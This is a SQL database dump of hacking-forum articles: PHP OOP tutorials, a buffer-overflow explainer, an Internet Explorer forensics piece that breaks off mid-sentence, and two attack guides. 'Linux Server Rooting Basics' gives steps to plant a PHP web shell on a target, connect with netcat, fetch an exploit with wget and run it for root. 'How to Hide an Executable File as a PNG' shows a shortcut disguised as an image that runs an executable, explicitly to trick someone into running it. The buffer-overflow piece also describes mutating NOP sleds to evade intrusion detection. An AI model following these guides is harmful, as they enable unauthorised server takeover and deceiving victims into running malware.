running.\r\n\r\n[img]http://i.imgur.com/ycNWj.jpg[/img]\r\nThe picture represents a heap-based buffer overflow occurring in the lowest part of the memory and in that way it overwrites other dynamic variables.\r\n\r\n[h2]Buffer Overflow Countermeasures[/h2]\r\nA hacker must know the exact memory address and the size of the stack in order to make the return pointer execute their code. A hacker can use a No Operation (NOP) instruction, which is just padding to move the instruction pointer and does not execute any code. The NOP instruction is added to a string before the malicious code to be executed. To bypass the IDS, the hacker can randomly replace some of the NOP instructions with equivalent pieces of code, such as: [code]x++,x-;?NOPNOP[/code]\r\nThis example of a mutated buffer overflow attack can bypass detection by an IDS. Programmers should not use the built-in strcpy(), strcat(), and streadd() C/C++ functions because they are susceptible to buffer overflows. Alternatively, Java can be used as the programming language since Java is not susceptible to buffer overflows.', 7061, 1),
(1190, 'PHP:OOP Part 1 - Abstract Classes & Interfaces', 'phpoop-abstract-classes-interfaces', 5, 1, FROM_UNIXTIME(1367193557), '[h1]Introduction[/h1]\r\nSince there have already been some object-oriented introductions around here, I decided to post about something that is not regularly discussed. As of the title, I''m gonna talk about abstract classes and interfaces. Usually, they are not commonly used in PHP. However, every self-respected programmer should know them mainly because:\r\n\r\n[color=#FFDAB9]It is an essential part of object-oriented programming[/color]\r\n- Nothing much more to add.\r\n[color=#FFDAB9]OOP is pretty identical in most programming languages[/color]\r\n- So as to learn or work in other languages under OOP, you need to have a good grasp of every concept in that style of programming \r\n[color=#FFDAB9]It''s mostly used in the development of big projects[/color]\r\n-  Especially if any third-party people have to modify your project\r\n\r\n[h1]How it works?[/h1]\r\nI''ll make some pretty basic explanation because from what I''ve seen on the net when started learning this, everything explained there was presented in a very high level. Basically, speaking they are contracts that enable you to define the rules under which an application should be working. Abstract classes and interfaces don''t achieve functionality in any way. For example, in the interfaces you don''t have any loops so as to extract or returning information. Let''s put up an example: Say you have developed an audio player like Winamp. So you''d like your software to work with different kinds of plugins or additional things. Using abstract classes and interfaces you synchronize the code so as to allow the usage of third-party software to yours (the way the third-party person works with your software and respectively the way you work with his). When it comes to the plugins allowance to access your code, you set up an interface which will define what methods should the external software should have and implement them. For example, if you were to say that the plugin should have at least three methods so as to be able to interact with your software, you could define the following ones.\r\n\r\n[color=#FFDAB9]getInfo[/color]\r\n- Which will return the information about the plugins author and usage\r\n[color=#FFDAB9]getSettings[/color]\r\n- Which will determine the options and capabilities of the software\r\n[color=#FFDAB9]setSettings[/color] \r\n- Which will apply the chosen/defined settings\r\n\r\n[h1]Interfaces[/h1]\r\nSo as to use them, we need to create them first. We do this with the keyword [color=#1E90FF]interface[/color] and then declare the name of it.\r\n[code]\r\n<?php\r\ninterface IGetInfo{\r\n     public function getInfo();\r\n}\r\n?>\r\n[/code]\r\n\r\nWe have visibility with the public scope and the method that should be implemented - getInfo();\r\n[color=#FF0000]Note:[/color] Since I already mentioned, interfaces and abstract classes don''t achieve functionality so any syntax like getInfo(){} is invalid.\r\n\r\nNow let''s define setInfo();. Because it is setInfo(); we ought to actually set something so we define a parameter that should be accepted for implementation.\r\n[code]\r\n<?php\r\ninterface IGetInfo{\r\n     public function getInfo();\r\n     public function setInfo($data);\r\n?>\r\n[/code]\r\n\r\nNow in order for the third-party person to make an implementation he could create a class and use our interfaces. In classes it is called extending and in interfaces - implementation.\r\n\r\n[code]\r\n<?php\r\ninterface IGetInfo{\r\n     public function getInfo();\r\n     public function setInfo($data);\r\n}\r\nclass User implements IGetInfo{\r\n     public function getInfo(){\r\n           return "Keeper";\r\n     }\r\n\r\n     public function setInfo($data){\r\n          // Do something\r\n     }\r\n}\r\n?>\r\n[/code]\r\n\r\nThat''s the most basic example I could think of. When implementing, we us the keyword [color=#1E90FF]implements[/color] after that we choose the method/methods. Now, one class can extend only another one, while in interface we can implement more than one. Let''s see how this goes below:\r\n\r\n[code]\r\n<?php\r\ninterface IGetInfo{\r\n     public function getInfo();\r\n     public function setInfo($data);\r\n}\r\ninterface Antagonism extends IGetInfo{\r\n     public function foo();\r\n}\r\nclass User implements Antagonism {\r\n     public function getInfo(){\r\n           return "Keeper";\r\n     }\r\n\r\n     public function setInfo($data){\r\n          // Do something\r\n     }\r\n}\r\n?>\r\n[/code]\r\n\r\n[h1]Abstract Classes[/h1]\r\nAn abstract class is any class that has at least one abstract method inside of it. For example, I have this following class (look below).\r\n\r\n[code]\r\n<?php\r\nclass User{\r\n     public function getInfo(){\r\n\r\n     }\r\n     abstract public function foo(){\r\n\r\n     }\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nIf we were to execute that, we would get an error.\r\n\r\n[code]Fatal Error: Abstract function User::foo() cannot contain body in ...[/code]\r\n\r\nThis occurs because as well as interfaces, abstract methods also cannot contain implementations. They can rather contain declarations. So whenever we define something as abstract, we cannot use {} because they indicate an action and we are simply not allowed to do that.\r\n\r\n[code]\r\n<?php\r\nclass User{\r\n     public function getInfo(){\r\n\r\n     }\r\n     abstract public function foo()\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nNow upon this execution of the code (where we removed the action), we would still get another error stating that we cannot have an abstract method inside a class that is not defined itself as abstract.\r\n\r\n[code]Fatal Error: Class User contains 1 abstract method and must therefore be declared abstract or implement the remaining method (User::foo) in ...[/code]\r\n\r\nThis means that whenever we declare something as abstract (in our case a method) inside a class, we make the whole class abstract. And this cannot happen inside the class, so we need to define it as abstract outside the class where we create it. Like so:\r\n\r\n[code]\r\n<?php\r\nabstract class User{\r\n     public function getInfo(){\r\n\r\n     }\r\n     abstract public function foo()\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nOne of the main difference between interfaces and abstract classes is that we can have properties or actions here.\r\n\r\n[code]\r\n<?php\r\nabstract class User{\r\n     public $data=array();\r\n     public function getInfo(){\r\n\r\n     }\r\n     abstract public function foo()\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nAs well as that, when we create an abstract class we cannot make an instance of it.\r\n\r\n[code]\r\n$Keeper=new User();\r\n[/code]\r\n\r\nThe only way we could use an abstract class is to extend it from another one. For example:\r\n\r\n[code]\r\nclass User1 extends Keeper{\r\n     public function foo(){\r\n         // Do something\r\n     }\r\n}\r\n$Infamous=new User1();\r\n[/code]\r\n\r\nTo proof the concept let''s execute this code which would return a string:\r\n\r\n[code]\r\n<?php\r\nabstract class User{\r\n     public $data=array();\r\n     public function getInfo(){\r\n           return "Contributed to Antagonism and Infamous";\r\n     }\r\n     abstract public function foo();\r\n}\r\nclass User1 extends Keeper{\r\n      public function foo(){\r\n\r\n     }\r\n}\r\n$Infamous=new User1();\r\necho $a->getInfo();\r\n\r\n?>\r\n[/code]\r\n\r\n[h1]Conclusion[/h1]\r\nI intend to post a lot more on object-oriented programming in PHP. This by far is my first PHP tutorial but expect a lot more in future.', 960, 0),
(1141, 'Linux Server Rooting Basics', 'linux-server-rooting-basics', 1, 1, FROM_UNIXTIME(1365771600), '[h1]Requirements[/h1]\r\nThe following are the materials you''ll need before starting:\r\n1. A PHP Shell (Preferably WSO or Ani-Shell which can be downloaded from Sourceforge or Google)\r\n2. Netcat\r\n3. A port forwarded router (To be able to back-connect to your shell hosted on your target)\r\n4. An exploited target (or a server)\r\n5. An exploit (Public or Private)\r\n\r\n[h1]Steps[/h1]\r\n[h2]First step[/h2]\r\nYou need to be able to gain remote control of your server/target. To get started, make sure you have a PHP shell uploaded on the your target''s server. A screenshot of a shelled target can look something like below:\r\n[img]http://i.imgur.com/Cn5xx.png[/img]\r\nObtain the IP address of your target as you would need it to perform back-connection. Once you have the IP address noted down, navigate your way to the "Network" section of the shell.\r\n\r\n[h2]Second step[/h2]\r\nWhile on your shell in the "Network" center, we''ll be using the "Bind Shell" method to establish a connection between our computer and your target.\r\nA screenshot below is an example of how it looks like:\r\n[img]http://i.imgur.com/stEw2.png[/img]\r\nEnter  your opened port number in the input port box.\r\n\r\n[h2]Third step[/h2]\r\nNow let''s move on to our computer and start setting up our connection.\r\nDownload Netcat and navigate to the extracted folder using Command Prompt.\r\nA demonstration of how it looks like below:\r\n[img]http://i.imgur.com/dDART.png[/img]\r\nEnter the command in this format:\r\n[code]nc  -v <Target''s IP Address> <Opened port number>[/code]\r\n\r\n[h2]Fourth step[/h2]\r\nGo back to your shell and click the connect button located beside the port input box.\r\nOnce that''s done, execute the command in your command prompt to establish a connection..\r\nIf successful, you should be able to execute Unix commands.\r\nSome of the unix commands are below:\r\n1. ls  (lists files in current directory)\r\n2. uname -a (displays the kernel version of the server)\r\n3. whoami (displays the current user)\r\n4. wget (remotely downloads file specified by a URL)\r\nYou can find more by going on here: http://fosswire.com\r\n\r\n[h2]Fifth step[/h2]\r\nNow, we''ll be using our command prompt to download the exploit remotely using "wget".\r\nYour command should look something like this:\r\n[code]wget http://site.com/exploit.zip[/code]\r\n\r\n[h2]Sixth step[/h2]\r\nAfter download the exploit zip file, use the following command to extract it.\r\n[code]unzip exploit.zip[/code]\r\n\r\nOnce that''s done, we''ll be giving full permissions to the file by chmodding to 777\r\n[code]chmod 777 exploit[/code]\r\n\r\n[h2]Last step[/h2]\r\nIf everything done above is succesful, you should be able to run the exploit like so:\r\n[code]./exploit[/code]\r\n\r\nIf successful, you should be able to be root.\r\nTo check, just enter "whoami" or "id"\r\n\r\n[h1]Video Example[/h1]\r\n[youtube]CfQVkPAeRVA[/youtube]\r\n\r\nThat''s just the basics of how to root. Sooner or later, I''ll be able to teach you guys how to perform more actions when owning a box and that includes compiling, bypassing and enumerating.\r\nAlso, will be showing you a tutorial on how to root via bruteforcing the root user credentials.\r\n\r\nAnyways, hope you learned from this tutorial.\r\nI''m ZeroFreak, also known as ZentrixPlus from http://zentrixplus.net\r\nThanks for viewing this article and have a nice day.', 1082, 0),
(1189, 'PHP:OOP Part 4 - Exception Handling & Namespaces Overview', 'phpoop-exception-handling-namespaces-overview', 5, 1, FROM_UNIXTIME(1367194706), '[h1]Try, Throw, Catch[/h1]\r\nThe title pretty much explains the purpose of try, throw and catch blocks. Most basically said, they handle specified errors upon their occurrence. We are also enabled to specify the error that should be output. We dispose with three main blocks which are not used independently from each other.\r\n\r\n[color=#FFDAB9]Try[/color]\r\n- The block that ''listens'' for any thrown exceptions\r\n[color=#FFDAB9]Throw[/color]\r\n- If any, the [color=#98FB98]Throw block[/color] sends them to the [color=#98FB98]Try block[/color]\r\n[color=#FFDAB9]Catch[/color]\r\n- [color=#98FB98]Catch block[/color] receives what the [color=#98FB98]Try block[/color] has sent\r\n\r\n\r\nFirst of all, I''d like to start off with some common ways which programmers use to return their errors and meanwhile explain the mechanism of try, throw, catch. As usual with our example. We have one class UserModel ([color=#00BFFF]UserModel.php[/color]) which supposedly would be the model of a user and one public method which takes a couple of parameters and registers them on the database.\r\n\r\n[code]\r\n<?php\r\n\r\nclass UserModel {\r\n\r\n      public function register($name, $email, $pass) {\r\n  \r\n      }\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nAnd we have our [color=#00BFFF]index.php[/color] which handles that data by some default values assigned beforehand and includes the [color=#00BFFF]UserModel.php[/color] file.\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''UserModel.php'';\r\n$user=new \\UserModel();\r\n\r\n$result=$app->user->register(''Keeper'', ''keeperr7@gmail.com'', ''uniquepassword'');\r\n\r\n?>\r\n[/code]\r\n\r\nThe first thing we should do in such case is to validate the incoming data because the model itself is an independent unit and without any validation, you can kinda imagine what can really happen. And an independent unit would mean that the model won''t be disturbed by whether someone calls it or not.\r\n\r\n[code]\r\n<?php\r\n\r\nclass UserModel {\r\n\r\n      public function register($name, $email, $pass) {\r\n            if(mb_strlen($name)>4){\r\n\r\n            }\r\n            else{\r\n                  return false;\r\n            }\r\n            return true;\r\n      }\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nWe have a simple loop to check for the length of the name, if the name is above 4 characters it return boolean true, if not boolean false. From the model point of view, there''s nothing wrong to code it like that. But from the point of view of the whole code and the programmer who calls this method, this is not practical. For example, when he gets returned boolean false, means that something has gone wrong but if we have like more than one if statements or any loop checks and use true and false as return values, the coder won''t be able to find out where the improper input has been used. Take for instance the following:\r\n\r\n[code]\r\n<?php\r\n\r\nclass UserModel {\r\n\r\n      public function register($name, $email, $pass) {\r\n            if(mb_strlen($name)>4){\r\n                if(mb_strlen($pass)>4{\r\n\r\n                } else {\r\n                     return false;\r\n                }\r\n            }\r\n            else{\r\n                  return false;\r\n            }\r\n            return true;\r\n      }\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nSo basically with all those boolean values we are unable to identify the input that is not acceptable. Now the next thing that people use to do in such cases is to return specific messages.\r\n\r\n[code]\r\n<?php\r\n\r\nclass UserModel {\r\n\r\n      public function register($name, $email, $pass) {\r\n            if(mb_strlen($name)>4){\r\n                if(mb_strlen($pass)>4{\r\n\r\n                } else {\r\n                     return ''Password is too short'';\r\n                }\r\n            }\r\n            else{\r\n                  return ''Username is too short'';\r\n            }\r\n            return true;\r\n      }\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nIn small projects or any tiny pieces of code that do not require any solid validation and sanitize of the input, this scheme is okay. But do be perfectly strict and accurate and actually practical whereas returning strings of data, we would have some public static properties and we will actually return the identifier of that public static property. However, that is not the idea of this tutorial so I won''t get into that now. \r\n\r\nSo the thing that is not practical with the above example is that the programmer should write a series of loops so as to describe every situation that may occur. The second thing that is not practical about it is its so-called impact on the semantics. Now what does that mean? It means that the public method register is not supposed to return the errors within itself. As a method, it is not his job to handle the errors but in this case to register the user.\r\n\r\nSo to the essence of this tutorial:\r\n\r\n[code]\r\n<?php\r\n\r\nclass UserModel {\r\n\r\n      public function register($name, $email, $pass) {\r\n            if(mb_strlen($name)>4){\r\n                if(mb_strlen($pass)>4{\r\n\r\n                } else {\r\n                     return ''Password is too short'';\r\n                }\r\n            }\r\n            else{\r\n                 throw new Exception(''Username is too short'', 74);\r\n            }\r\n            return true;\r\n      }\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nWe throw an exception using the Throw block. It''s literally nothing more than an ordinary class, the difference is that it is embedded in PHP and we do not need to write a file for it and so on. The first check does not pass because the string ''Keeper'' has more than 4 characters. Upon executing this code we are returned with an error stating the following:\r\n\r\n[code]\r\nFatal error: Uncaught exception ''Exception'' with message ''Username is too short'' in ...\r\n[/code]\r\n\r\nBecause we haven''t declared the Try block therefore we receive uncaught exception as a result. We throw an error but do not catch and modify it. The defining of the Try block should be done in there, where we call the class (in our case [color=#98FB98]index.php[/color]).\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''UserModel.php'';\r\n$user=new \\UserModel();\r\n\r\n try {\r\n      $result=$app->user->register(''Keeper'', ''keeperr7@gmail.com'', ''uniquepassword'');\r\n } catch (Exception $exc) {\r\n       echo $exc->getTraceAsString();\r\n }\r\n\r\n?>\r\n[/code]\r\n\r\nAs I said in the introduction, the job of the Try segment (block) is to listen if anything between its scope throws and exception. If so, it sends it to the Catch block. Otherwise, if there is nothing wrong, no error is being returned as if the catch block does not exist.\r\n\r\nThe Catch block will be executed automatically only if any of these codes throw an exception. Catch accepts one parameter called $exc. It comes from exception and it''s practically one regular object which has a few embedded methods for itself. They are:\r\n\r\n\r\n[color=#FFDAB9]__toString();[/color]\r\n- A magic method which represents an exception as a string value. It accepts no parameters therefore\r\n[color=#98FB98]getCode();[/color]\r\n- Takes the exception code (the parameter for the code in the exception is obligatory). It accepts no parameters as well\r\n[color=#FFDAB9]getFile();[/color]\r\n- Gets the file in which the exception has occurred\r\n[color=#98FB98]getLine();[/color]\r\n- Gets the line in which the exception has occurred\r\n[color=#FFDAB9]getMessage();[/color]\r\n- Grabs the exception message\r\n[color=#98FB98]getPrevious();[/color]\r\n- Used to return the previous exception (if any) - not an obligatory parameter of the exception class\r\n[color=#FFDAB9]getTrace();[/color]\r\n- Not sure really. Read it on php.net - I never came to use this one\r\n[color=#98FB98]getTraceAsString();[/color]\r\n- Does the same as getTrace but converts the value to a string\r\n\r\n\r\nNotice that Throw always works with objects which are exceptions. For example executing the class using getLine(); will output the line where the error has occurred. In this case it will be 13. If we use getFile(); it will respectively return the file where it has occurred and so on. I have explained them above.\r\n\r\nIn some specific cases, Try, Throw, Catch comes in handy mainly because of its flexibility. First, we listen for whatever exception there might occur, no matter where it has occurred.\r\n\r\n[code]\r\n try {\r\n      $result=$app->user->register(''Keeper'', ''keeperr7@gmail.com'', ''uniquepassword'');\r\n }\r\n[/code]\r\n\r\nAs well as that we can work with any problems that might occur during the process of establishing a connection to the database server. Say we have failed to connect to the stmt server. We''d have the following exception that would notify us if so.\r\n\r\n[code]\r\n<?php\r\n\r\nclass UserModel {\r\n\r\n      public function register($name, $email, $pass) {\r\n            if(mb_strlen($name)>4){\r\n                if(mb_strlen($pass)>4{\r\n                      new mysqli_stmt();\r\n                } else {\r\n                     return ''Password is too short'';\r\n                }\r\n            }\r\n            else{\r\n                 throw new Exception(''Username is too short'', 74);\r\n            }\r\n            return true;\r\n      }\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nThis exception will be thrown and caught by the Try, Catch mechanism. And as I already mentioned twice, those exception are objects. So we can, for example, make another class which extends the basic class Exception.\r\n\r\n[code]\r\n<?php\r\n\r\nclass UserModel {\r\n\r\n      public function register($name, $email, $pass) {\r\n            if(mb_strlen($name)>4){\r\n                if(mb_strlen($pass)>4{\r\n                      new mysqli_stmt();\r\n                } else {\r\n                     return ''Password is too short'';\r\n                }\r\n            }\r\n            else{\r\n                 throw new MyException(''Username is too short'', 74);\r\n            }\r\n            return true;\r\n      }\r\n}\r\n\r\nclass MyException extends Exception{\r\n\r\n     public function Infamous() {\r\n           echo ''Infamous Forever'';\r\n     }\r\n}\r\n?>\r\n[/code]\r\n\r\nAlso whereas throwing the method Exception, we will throw MyException to proof the concept that the below class inherits the one above it. And actually call this in our [color=#00BFFF]index.php[/color]:\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''UserModel.php'';\r\n$user=new \\UserModel();\r\n\r\n try {\r\n      $result=$app->user->register(''Keeper'', ''keeperr7@gmail.com'', ''uniquepassword'');\r\n } catch (Exception $exc) {\r\n       echo $exc->Infamous();\r\n }\r\n\r\n?>\r\n[/code]\r\n\r\nThis returns the string ''Infamous'' as expected. So we can execute our own methods. Besides that, you might have noticed the syntax of the Catch block. In particular this line:\r\n\r\n[code]\r\ncatch (Exception $exc){}\r\n[/code]\r\n\r\nThis is specific only for PHP, as far as I am aware. What this does is force us to have a certain type. So if we write the code like so:\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''UserModel.php'';\r\n$user=new \\UserModel();\r\n\r\n try {\r\n      $result=$app->user->register(''Keeper'', ''keeperr7@gmail.com'', ''uniquepassword'');\r\n }\r\n catch (Exception $exc) {\r\n       echo $exc->Infamous();\r\n }\r\n catch (MyException $exc) {\r\n       echo $exc->Infamous();\r\n }\r\n\r\n?>\r\n[/code]\r\n\r\nAnd modify the object in our UserModel class at ([color=#98FB98]UserModel.php[/color]) to the type of MyException, it will be executed in this line of our [color=#00BFFF]index.php[/color]:\r\n\r\n[code]\r\n catch (MyException $exc) {\r\n       echo $exc->Infamous();\r\n }\r\n[/code]\r\n\r\nNow another thing that is also good to know about exception handling is that we may have a sequence of Catch blocks as I did in the above examples. Now let''s throw a new exception for the password loop.\r\n\r\n[code]\r\n<?php\r\n\r\nclass UserModel {\r\n\r\n      public function register($name, $email, $pass) {\r\n            if(mb_strlen($name)>4){\r\n                if(mb_strlen($pass)>4{\r\n                      new mysqli_stmt();\r\n                } else {\r\n                     throw new Exception("Password is too short", 43);\r\n                }\r\n            }\r\n            else{\r\n                 throw new MyException(''Username is too short'', 74);\r\n            }\r\n            return true;\r\n      }\r\n}\r\n\r\nclass MyException extends Exception{\r\n\r\n     public function Infamous() {\r\n           echo ''Infamous Forever'';\r\n     }\r\n}\r\n?>\r\n[/code]\r\n\r\nIn this case the object that is going to be executed will be Exception(), not MyException(). In that way we say that the MyException() object will be executed only when we have MyException() in the class. This Catch block here:\r\n\r\n[code]\r\n catch (Exception $exc) {\r\n       echo $exc->Infamous();\r\n }\r\n[/code]\r\n\r\nAs of our Catch block situations in our code, you need to be aware that their sequence of writing is important. So take that in mind as well.\r\n\r\n[h1]Namespaces[/h1]\r\nBefore we start off, I''d like to mention that namespaces are available only in PHP version 5.3 and above in order to escape further questions if anyone experiences an error using an older version. Now namespace is a functionality of PHP that enables us a better organising of our classes in hierarchical structures. Said in an easier manner, the logical sequence of where everything is gonna be placed. Aside from that, it is not mandatory to use this because it''s just a way to structure you classes in a logical sequence as I said.\r\n\r\n[h2]How it works?[/h2]\r\nNow imagine that namespaces are directories (just do it). When we declare a namespace, imagine that everything within it is in a folder. And when we want to access the class User, we say - this file from that folder. That is in fact realistic and I thought it would clear things up. So an example for this would be the following. Suppose we have a project under a framework (MVC for example - my favourite) and we have our controller and model. Within those folders are our classes and so on. When we have a file bearing the same name as another one in another directory, we cannot include them both. Before the introduction of namespaces in PHP 5.3, most coders used to add prefixes and suffixes to the classes they included. But for now, it''s just good to know that. Now to my favourite examples:\r\n\r\n[code]\r\n<?php\r\n\r\nnamespace Model;\r\n\r\nclass User {\r\n\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nAnd we do the same thing in the other [color=#00BFFF]User.php[/color] class file [u][b]BUT[/b][/u] with a different value after the keyword namespace. For example - Cont (abbreviated from controller).\r\n\r\nSo now when we execute both classes with the same name and have them included in our [color=#00BFFF]index.php[/color]\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''Controller/User.php'';\r\ninclude ''Model/User.php'';\r\n\r\n?>\r\n[/code]\r\n\r\nThis time we don''t get an error because namespaces have been declared. So if we want to create an instance of a class we could easily do it like so:\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''Controller/User.php'';\r\ninclude ''Model/User.php'';\r\n\r\n$a = new Model\\User();\r\n$b = new Cont\\User();\r\n\r\n?>\r\n[/code]\r\n\r\nAnother thing you should be aware of is that namespace should be declared at the very beginning of our code. Above it there is only one thing that could be added - comments. In that way if we declare a class above the namespace it will not be part of it simply.\r\n\r\n[code]\r\n<?php\r\n\r\nclass Keeper {}\r\n\r\nnamespace Model;\r\n\r\nclass User {\r\n\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nAs well as that we can declare sub namespaces like (notice that the backwards slash is specific for PHP, it''s the separator we need to use):\r\n\r\n[code]\r\n<?php\r\n\r\nnamespace Model\\User;\r\nclass User {\r\n\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nNow in order to refer to it in our [color=#98FB98]index.php[/color] we need to point the directory it''s in (as it''s a namespace of a namespace).\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''Controller/User.php'';\r\ninclude ''Model/User.php'';\r\n\r\n$a = new Model\\User\\User();\r\n$b = new Cont\\User();\r\n\r\n?>\r\n[/code]\r\n\r\nHere comes the time to talk about global namespaces. You might actually guess from now what that means. Classes that do not have a namespace, PHP places them in one global namespace. So for example we make an instance, simply, like so because PHP reads it as a global namespace automatically:\r\n\r\n[code]\r\n<?php\r\n\r\nnew User();\r\n\r\n?>\r\n[/code]\r\n\r\nSo all in all, this means that everything that is not in a declared namespace is automatically situated in a global namespace which we can access and refer to directly.\r\n\r\n[i][color=#FF0000][u]Note:[/u][/color][/i] Though it may seem weird but never use [b]PHP[/b] as a name for a namespace. It will not return an error but will mess up the whole structure of php configurations for namespaces.\r\n\r\n[h1]Conclusion[/h1]\r\nNothing much to add. This was the fourth tutorial of my series. I elaborated more on some of the subjects in this tutorial than I should have and that is the reason I marked the session as an extended version. I also thought of including type hinting in this part but later on I altered my decision because it seemed to much material for a single tutorial. Again, this is by far not my last tutorial. [i]Expect the next ones from my series and thanks for reading![/i]', 708, 0);
INSERT INTO `articles` (`article_id`, `title`, `slug`, `category_id`, `user_id`, `submitted`, `body`, `views`, `featured`) VALUES
(1159, 'How to Hide an Executable File as a PNG', 'how-to-hide-an-executable-file-as-a-png', 11, 1, FROM_UNIXTIME(1361115756), '[h1]Introduction[/h1]\r\nI''ve often heard that someone wants to have an exe hidden in a picture and run it by clicking on it, so in this article I will show you how you can run an executable file as png.\r\n(If you open the task-manager it will show you the png in it)\r\nIt''s the best solution I found so far and I think it might help.\r\n\r\n[h1]What do I need?[/h1]\r\n[b]You need at least 2 Files to do this![/b]\r\n\r\n[b]File 1:[/b] Your executable File [ [u]file1.exe[/u] ]\r\n[b]File 2:[/b] A link [ [u]file2.lnk[/u] - You usually won''t see the .lnk ]\r\n[i]Just create a link to the file 1 and use it as file 2.[/i]\r\n\r\n[b]File 2 will run the first file. If you click on the File 1 you will get an error.[/b]\r\n\r\n[h1]File 1 - The executable file[/h1]\r\nLet''s start with the first File..\r\nYou can just take any *.exe you want to test it!\r\nI made a simple C-Console Program to do it, so you can just use a ''Hello World!''-Program!\r\n[code]#include <stdio.h>\r\n#include <stdlib.h>\r\nint main() {\r\n    printf("Hello World!\\n");\r\n    system("pause");\r\n    return 0;\r\n}[/code]\r\nYou now change the file extension to .png (You can also change it to .jpg, .gif, or whatever you want).\r\nOnce you''ve done that you may want to rename the file to something like IMG_FROM_UNIXTIME(0115022013).png.\r\n\r\nSo the first thing you do is to rename: [b]file1.exe[/b]\r\nTo: [b]IMG_FROM_UNIXTIME(0115022013).png[/b]\r\n\r\n[h1]File 2 - The link which runs the executable[/h1]\r\nNow the file 2!\r\nThis file actually is the only problem because this file will still be the same. You can actually see that it is a link!\r\nBut many people don''t see the file extension (because they didn''t activate them) and even if they have them activated you will see the file extension .png.\r\nSo the first thing you do with the file 2 is that you rename it to [b]IMG_FROM_UNIXTIME(0215022013).png[/b] or something like that..\r\nNow you right-click on it and change the target to:\r\n[code]C:\\Windows\\System32\\cmd.exe /c IMG_FROM_UNIXTIME(0115022013).png[/code]\r\nYou now might want to change the Icon of the link (file 2: IMG_FROM_UNIXTIME(0215022013).png). Just choose an Icon that fits for a png.\r\n\r\n[h1]How to use it[/h1]\r\nYou now should have this:\r\n[b]File 1:[/b] IMG_FROM_UNIXTIME(0115022013).png (Your executable file)\r\n[b]File 2:[/b] IMG_FROM_UNIXTIME(0215022013).png (Your link which runs the executable file via cmd)\r\n\r\nIf you now want to run the file 1 you''ll have to click on the file 2. If you now take a look in the task-manager you will find the file: [b]IMG_FROM_UNIXTIME(0115022013).png[/b] (File 1)\r\n\r\nIf you want to make someone run it without knowing that he will run your file 1 you can just copy the file 2 as often as you want and rename it. Now you hide your file 1 between all those other files. You can now just send him a folder with all your files in it.\r\n\r\n[h1]Shortened Form[/h1]\r\n1. File: [b]File1.exe[/b] --rename to-->[b] IMG_FROM_UNIXTIME(0115022013).png[/b]\r\n2. FIle: [b]File2.lnk[/b] --rename to--> [b]IMG_FROM_UNIXTIME(0215022013).png[/b] --right-click--> change target to--> \r\n[code]C:\\Windows\\System32\\cmd.exe /c IMG_FROM_UNIXTIME(0115022013).png[/code]\r\n[b]IMG_FROM_UNIXTIME(0215022013).png[/b] --change icon to--> an icon that fits to a png file\r\n\r\nDouble-click on the [b]IMG_FROM_UNIXTIME(0215022013).png[/b] to run the executable file.\r\n\r\n[h1]Pros & Cons[/h1]\r\n[h2]Pros[/h2]\r\n[list]\r\n[*] You can hide your executable file between ''images''\r\n[*] The task-manager will show you an image and not an executable\r\n[*] Someone who doesn''t expect an executable file won''t notice the link\r\n[/list]\r\n\r\n[h2]Cons[/h2]\r\n[list]\r\n[*] You will need at least 2 files\r\n[*] You can hide the executable file but not the link\r\n[*] You will get an error if you execute the file 1 directly\r\n[/list]', 3519, 0),
(1171, 'Internet Explorer Forensic Investigation ', 'internet-explorer-forensic-investigation', 12, 1, FROM_UNIXTIME(1365077716), '[h1]Introduction[/h1]\r\nThis article is about forensic investigation of Internet Explorer. This is cover about investigating Internet Explorer history, cache, cookies, favorites. Lets take a look at index.dat file\r\n\r\n[h2]Index.dat[/h2]\r\nMicrosoft''s Internet Explorer has two primary areas of interest. One is â€œindex.datâ€ database file which is used by the web browser and the browser cache. index.dat is in the format of MSIECF (Microsoft Internet Explorer Cache File Format). The index.dat file contains information of visited URLs including the accessed and modified time, the location of cache directory, HTTP headers and so on and so fourth. Almost every software uses IExplorer for displaying information and for connecting over internet. Programs like skype, Live messenger, etc uses IE. So the history of accessed urls of those applications are also stored in index.dat.\r\n\r\nThe location of index.dat file\r\n\r\n[code]Windows XP systems:\r\nC:\\Documents and Settings\\%username%\\Local Settings\\Temporary Internet Files\\Content.IE5\r\n\r\n\r\nWindows vista and 7:\r\nC:\\Users\\%username%\\ AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5[/code]\r\n\r\nNow lets start investigating the index.dat file. I will use a tool name [url=http://sourceforge.net/projects/fast/files/Pasco/]pasco[/url] by Foundstone which is very old but still used is many Live forensic distros. Here is a example\r\n\r\n./pasco -d index.dat\r\n\r\nAs you see this will give the out put in the following format.\r\n\r\n[code]TYPE URL MODIFIED TIME ACCESS TIME FILENAME DIRECTORY HTTP HEADERS\r\n[/code]\r\n\r\n[img]http://i.imgur.com/LyvHYYi.png[/img]\r\nAs this is not clear it is better to get a output to a file simple by using ./pasco > outputfile\r\n\r\nThere is another tool which we extract information in a organized manner. It is called [url=http://code.google.com/p/libmsiecf/]msiecfexport[/url].\r\nHere is an example:\r\n\r\n[img]http://i.imgur.com/RxEdraJ.png[/img]\r\nSo you can clearly view the index.dat file. \r\n\r\n[h2]Cache[/h2]\r\n\r\nNext we''ll investigate the cache files. Cache files are stored locally as a result of the user''s web browsing. These files are stored in\r\n\r\n[code]Windows XP :\r\nC:\\Documents and Settings\\%username%\\Local Settings\\Temporary Internet Files\\Content.IE5\r\n\r\n\r\nWindows vista and 7:\r\nC:\\Users\\%username%\\AppData\\ Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5[/code]\r\n\r\nI will take an example from 